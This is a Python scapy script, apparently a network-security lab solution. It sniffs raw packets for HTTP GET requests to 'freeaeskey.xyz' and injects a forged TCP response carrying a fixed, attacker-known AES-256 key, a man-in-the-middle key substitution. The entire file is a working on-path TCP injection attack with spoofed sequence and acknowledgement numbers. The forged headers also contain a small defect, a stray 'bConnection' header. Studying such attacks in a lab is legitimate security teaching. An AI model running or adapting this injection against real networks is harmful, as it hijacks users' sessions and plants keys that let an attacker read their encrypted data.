from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP, IP, Ether, Raw
import socket
import re
import datetime

# Known Key used in MIM attack
knownKey = b'4d6167696320576f7264733a2053717565616d697368204f7373696672616765'

# Resolve the target hostname to an IP address
targetHost = "freeaeskey.xyz"
targetIP = socket.gethostbyname(targetHost)

# Request Strings
getRequest = b"GET / HTTP/1.1"

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket = L3RawSocket
    send(pkt)


def handle_pkt(pkt):
    packet = Ether(pkt)
    
    # Check for packets to the target
    if packet.haslayer(TCP) and packet.haslayer(IP) and packet[IP].dst == targetIP:
        if getRequest in bytes(packet[TCP].payload):

            # Create the IP layer
            ipLayer = IP(src=targetIP, dst=packet[IP].src)
            tcpLayer = TCP(
                        sport=packet[TCP].dport,
                        dport=packet[TCP].sport,
                        seq=packet[TCP].ack,
                        ack=(packet[TCP].seq + len(packet[TCP].payload)),
                        flags="PA")
            
            # Spoof the response
            response = b'HTTP/1.1 200 OK\r\nContent-Length: 335\r\nContent-Type: text/html; charset=UTF-8\r\nServer: Caddy\r\n'
            response += b'Date:' + datetime.datetime.now().strftime("%a, %d %b %Y %H:%M:%S").encode('utf-8') + b' GMT\r\nbConnection: close\r\n\r\n'
            response += b'<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n'
            response += b'<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> '
            response += b'AES-256 key: <b>' + knownKey + b'</b><br/>\n</body>\n</html>'

            rawLayer = Raw(load=response)

            newPacket = ipLayer / tcpLayer / rawLayer

            inject_pkt(newPacket)

            
   

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)

    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()